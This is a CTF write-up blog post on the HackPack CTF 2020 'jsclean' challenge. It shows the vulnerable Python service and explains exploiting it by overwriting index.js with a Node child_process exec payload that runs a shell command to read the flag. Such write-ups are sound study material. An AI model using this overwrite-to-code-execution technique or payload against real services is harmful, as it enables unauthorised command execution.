---
layout: post
title: HackPack CTF 2020 - jsclean 
---

> JavaScript Cleaning Service: Transform ugly JavaScript files to pretty clean JavaScript files!
>
> nc cha.hackpack.club:41718
>
> Files: [repo][repo]

## Analysis

In this challenge we can see the source code of the service running on target system.

{% highlight python %}
import os
import sys
import subprocess


def main(argv):
    print("Welcome To JavaScript Cleaner")
    js_name = input("Enter Js File Name To Clean: ")
    code = input("Submit valid JavaScript Code: ")

    js_name = os.path.basename(js_name) # No Directory Traversal for you

    if not ".js" in js_name:
        print("No a Js File")
        return

    with open(js_name,'w') as fin:
        fin.write(code)

    p = subprocess.run(['/usr/bin/nodejs','index.js','-f',js_name],stdout=subprocess.PIPE);
    print(p.stdout.decode('utf-8'))

main(sys.argv)
{% endhighlight %}

Service accepts javascript filename and content, then it saved under specified filename. Once thats done it executes `index.js` by passing our file as one of the arguments.

We can easily exploit this service by overwriting index.js file with our content and executing any command we want.

We pass as filename: `index.js`

And javascript content that will execute commands:

{% highlight javascript %}
require("child_process").exec("cat flag.txt", function(error, stdout, stderr){console.log(stdout);});
{% endhighlight %}

[repo]: https://github.com/r0ck3tz/ctfs/tree/master/2020/hackpackctf/jsclean
